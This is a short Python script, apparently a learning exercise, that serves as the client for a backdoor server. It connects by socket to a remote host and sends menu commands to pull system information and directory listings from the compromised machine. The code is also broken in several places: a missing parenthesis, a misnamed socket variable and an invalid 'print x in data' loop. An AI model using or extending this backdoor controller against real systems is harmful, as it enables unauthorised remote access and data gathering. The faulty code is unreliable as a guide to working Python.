#!/usr/bin/env python3

# Connect to the backdoor server

import socket

SRV_ADDR = input("Enter the server IP: ")
SRV_PORT = int(input("Enter the server port: ")

def print_menue():
    print("""\n\n0) Close the connection
1) Get sysinfo
2) List dir contents""")

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_sock.connect((SRV_ADDR, SRV_PORT))

print("Connection established")
print_menue()

while 1:
    message = input ("\n-Select an option: ")

    if (message == "0"):
        my_sock.sendall(message.encode())
        my_sock.close()
        break

    elif(message == "1"):
        my_sock.sendall(message.encode())
        data = my_socket.recv(1024)
        if not data: break
        print(data.decode('utf-8'))

    elif(message == "2"):
        path = input("Insert the path: ")
        my_sock.sendall(message.encode())
        my_sock.sendall(path.encode())
        data = my_sock.recv(1024)
        data = data.decode('utf').split(",")
        print x in data:
            print(x)
        print("*"*40)

    print_menue()
